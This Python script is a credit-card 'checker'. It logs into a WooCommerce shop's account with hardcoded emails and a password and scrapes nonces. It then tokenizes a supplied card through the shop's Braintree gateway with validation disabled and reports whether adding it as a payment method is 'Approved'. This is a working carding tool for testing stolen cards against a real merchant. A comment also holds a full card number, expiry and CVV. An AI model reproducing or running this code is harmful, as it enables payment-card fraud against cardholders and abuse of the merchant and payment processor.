def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	acc = ['moh552vbnm1@gmail.com;','moh552vbnm2@gmail.com','moh552vbnm3@gmail.com','moh552vbnm4@gmail.com','moh552vbnm5@gmail.com']
	email = random.choice(acc)



	headers = {
    'authority': 'identityfashion.online',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9',
    'cache-control': 'no-cache',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = r.get('https://identityfashion.online/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))


	headers = {
    'authority': 'identityfashion.online',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'username': email,
    'password': 'jojo@ALi123',
    'woocommerce-login-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
}

	response = r.post(
    'https://identityfashion.online/my-account/add-payment-method/',
    headers=headers,
    data=data,
)
#0


	headers = {
    'authority': 'identityfashion.online',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9',
    'cache-control': 'no-cache',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = r.get('https://identityfashion.online/my-account/add-payment-method/', headers=headers)

	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)

	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	

#&
	headers = {
    'authority': 'identityfashion.online',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://identityfashion.online',
    'pragma': 'no-cache',
    'referer': 'https://identityfashion.online/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client_token_nonce,
}

	response = r.post('https://identityfashion.online/wp-admin/admin-ajax.php', headers=headers, data=data)


	
	encoded_text = response.json()['data']
	
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]

#4




	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'a07755a5-f7d3-46c0-b17e-d2d530e6046b',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"a07755a5-f7d3-46c0-b17e-d2d530e6046b"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5111972036167182","expirationMonth":"03","expirationYear":"2028","cvv":"793"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)

	tok = response.json()['data']['tokenizeCreditCard']['token']

#5




	headers = {
    'authority': 'identityfashion.online',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://identityfashion.online',
    'pragma': 'no-cache',
    'referer': 'https://identityfashion.online/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '13.98',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '{"correlation_id":"de63ee79235fcfe2ca364781c3913bc6"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = r.post(
    'https://identityfashion.online/my-account/add-payment-method/',
    cookies=r.cookies,
    headers=headers,
    data=data,
)

	text = response.text
	pattern = r'Status code (.*?)\s*</li>'

	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'authenticate_rejected' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	

